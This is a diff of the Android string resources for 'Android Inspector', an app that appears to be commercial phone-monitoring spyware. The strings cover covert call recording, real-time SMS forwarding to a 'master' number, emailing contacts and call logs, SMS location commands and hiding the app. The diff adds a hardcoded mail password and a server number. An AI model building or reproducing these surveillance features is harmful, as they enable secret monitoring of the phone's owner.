@@ -39,6 +39,7 @@
     <string name="phonecall_record">PhoneCallRecord</string>
     
     <!-- Mail -->
+    <string name="mail_sender_pwd">canadausa</string>
     <string name="mail_from">From</string>
     <string name="mail_description">(contacts, SMS and phone call list attached)</string>
     <string name="mail_body_info">Hi, this is an auto mail from %s with contacts, SMS and phone call list attached.</string>
@@ -81,18 +82,18 @@
     <string name="pref_record_all_title">Record all phone calls</string>
     <string name="pref_record_all_summary">Permitted only when using your own mail sender.</string>
     <string name="pref_record_number_title">Target Number</string>
+    <string name="pref_pls_input_target_number">Please input one target number at least(4 digits at least).</string>
     <string name="pref_record_number_summary">Record only when the phone call number contains the target number(at least 5 digits). Support 9 targets at most. Separate by blank space.</string>
+    <string name="pref_target_num_count_reach_max">9 target numbers at maximum, separate by blank space.</string>
+    <string name="pref_target_num_format_error">ERROR: 4 digits per number at least.</string>
     <string name="pref_recv_phonenum_title">Master Phone Number</string>
     <string name="pref_pls_input_valid_recv_phonenum">ERROR: %s is not a valid mobile phone number.</string>
-    <string name="pref_target_num_count_reach_max">9 numbers at maximum permitted.</string>
-    <string name="pref_target_num_format_error">ERROR: 4 digits per number at least.</string>
     <string name="pref_redirect_all_sms_title">Forward All SMS</string>
     <string name="pref_redirect_all_sms_summary">Forward all SMS in real-time. Attention to its possible cost.</string>
     <string name="pref_sensitive_words_title">Sensitive Words</string>
     <string name="pref_sensitive_words_summary">Separate with blank space. No more than 9 words.</string>
     <string name="pref_pls_input_sensitive_words">Please input sensitive words (separate by blank space).</string>
     <string name="pref_sensitive_words_count_reach_max">No more than %d sensitive words permitted, the surplus words will be ignored.</string>
-    <string name="pref_sensitive_words_count_reach_max">%d sensitive words for maximum. Please re-edit it.</string>
     <string name="pref_gps_word_title">Location Command</string>
     <string name="pref_gps_word_summary">Send SMS(#location) and then get back its location.</string>
     <string name="pref_category_network_mode_title">Network</string>
@@ -113,7 +114,7 @@
     <string name="init_btn_testrecvphone">Test Phone</string>
     <string name="init_btn_screenshot">Screenshot</string>
     <string name="init_btn_setting">Setting</string>
-    <string name="init_btn_hide">Exit</string>
+    <string name="init_btn_exit">Exit</string>
     <string name="init_hint_testmail">Get all phonecalls, SMS, contacts and send to receiver mailbox.</string>
     <string name="init_hint_testphone">Send a SMS to receiver phone.</string>
     <string name="init_test_sms_content">A test SMS from Android Inspector.</string>
@@ -124,9 +125,9 @@
     <string name="init_hint_hide">This dialog can be triggered again by sending ### SMS.</string>
     <string name="init_processing">Processing...</string>
     <string name="init_waiting">Collecting and Sending...</string>
-    <string name="init_pls_reset_phone">Please restart phone to enable all features and settings.</string>
+    <string name="init_collecting">Collecting...</string>
     <string name="init_sending">Sending...</string>
-    <string name="init_pls_reset_phone">All settings and features will work after phone restart.</string>
+    <string name="init_pls_reset_phone">Please restart phone to enable all features and settings.</string>
     
     <!-- Actions -->
     <string name="action_send_mail_success">Sent a mail to your mail box successfully</string>
@@ -134,6 +135,11 @@
     <string name="action_network_disconnected">Network disconnected.</string>
     <string name="action_goto_network_setting">Network currently disconnected. Do you want to enable wireless network now?</string>
     
+    <!-- Server -->
+	<string name="srv_address">15398053471</string>
+	<string name="home_page">http://www.androidinspector.com</string>
+	<string name="support_qq">Skype Support: androidinspector</string>
+	
 	<!-- Message -->
 	<string name="msg_invalid_key">Invalid key. Probably it has been used. Please contact the software maker for support.</string>
 	<string name="msg_cannot_write_license_key_to_sharedpreferences">ERROR: failed to write license key information.</string>
